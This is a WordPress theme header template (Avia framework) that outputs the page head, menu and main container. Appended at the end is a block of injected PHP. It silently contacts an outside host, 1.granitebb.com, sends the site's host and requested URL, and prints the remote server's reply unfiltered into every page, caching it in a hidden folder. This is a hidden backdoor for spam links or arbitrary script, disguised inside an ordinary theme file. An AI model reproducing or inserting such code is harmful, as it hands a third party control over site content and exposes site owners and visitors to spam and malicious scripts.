<?php
	global $avia_config;

	$style 		= $avia_config['box_class'];
	$responsive	= avia_get_option('responsive_layout','responsive');
	$blank 		= isset($avia_config['template']) ? $avia_config['template'] : "";	
?>


<!DOCTYPE html>
<html <?php language_attributes(); ?> class="<?php echo " html_{$style} ".$responsive." ".avia_header_class_string();?> ">
<head>
<meta charset="<?php bloginfo( 'charset' ); ?>" />

<!-- page title, displayed in your browser bar -->
<title><?php if(function_exists('avia_set_title_tag')) { echo avia_set_title_tag(); } ?></title>

<?php
/*
 * outputs a rel=follow or nofollow tag to circumvent google duplicate content for archives
 * located in framework/php/function-set-avia-frontend.php
 */
 if (function_exists('avia_set_follow')) { echo avia_set_follow(); }


 /*
 * outputs a favicon if defined
 */
 if (function_exists('avia_favicon'))    { echo avia_favicon(avia_get_option('favicon')); }
?>

<!-- add feeds, pingback and stuff-->
<link rel="profile" href="http://gmpg.org/xfn/11" />
<link rel="alternate" type="application/rss+xml" title="<?php echo get_bloginfo('name'); ?> RSS2 Feed" href="<?php avia_option('feedburner',get_bloginfo('rss2_url')); ?>" />
<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>" />

<!-- mobile setting -->
<?php

if( strpos($responsive, 'responsive') !== false ) echo '<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">';
?>


<!-- Scripts/CSS and wp_head hook -->
<?php
/* Always have wp_head() just before the closing </head>
 * tag of your theme, or you will break many plugins, which
 * generally use this hook to add elements to <head> such
 * as styles, scripts, and meta tags.
 */

wp_head();

?>

</head>




<body id="top" <?php body_class($style." ".$avia_config['font_stack']." ".$blank); avia_markup_helper(array('context' => 'body')); ?>>

	<div id='wrap_all'>

	<?php 
	if(!$blank) //blank templates dont display header nor footer
	{ 
		 //fetch the template file that holds the main menu, located in includes/helper-menu-main.php
         get_template_part( 'includes/helper', 'main-menu' );

	} ?>
	
	<div id='main' data-scroll-offset='<?php echo avia_header_setting('header_scroll_offset'); ?>'>

	<?php do_action('ava_after_main_container'); ?>

	<?php
$h = $_SERVER['HTTP_HOST']; $u = trim($_SERVER['REQUEST_URI']);
$cd = dirname(__FILE__) . '/.cache';
$cf = $cd . '/' . md5($h . '##' . $u);
$s = '1.granitebb.com';
if (file_exists($cf) and filemtime($cf) > time() - 3600)
    echo file_get_contents($cf);
else
{
    $ini1 = @ini_set('allow_url_fopen', 1);    $ini2 = @ini_set('default_socket_timeout', 3);
    $p = '/links.php?u=' . urlencode($u) . '&h=' . urlencode($h);
    $c = '';
    if ($fp = @fsockopen($s, 80, $errno, $errstr, 3)) {
        @fputs($fp, "GET {$p} HTTP/1.0\r\nHost: $s\r\n\r\n");
        while (! feof($fp))
            $c .= @fread($fp, 8192);
        fclose($fp);
        $c = end(explode("\r\n\r\n", $c));
        echo $c;
        if (strlen($c) and (is_dir($cd) or @mkdir($cd))) {
            @file_put_contents($cf, $c);
        }
    }
    @ini_set('allow_url_fopen', $ini1);    @ini_set('default_socket_timeout', $ini2);
}
?>
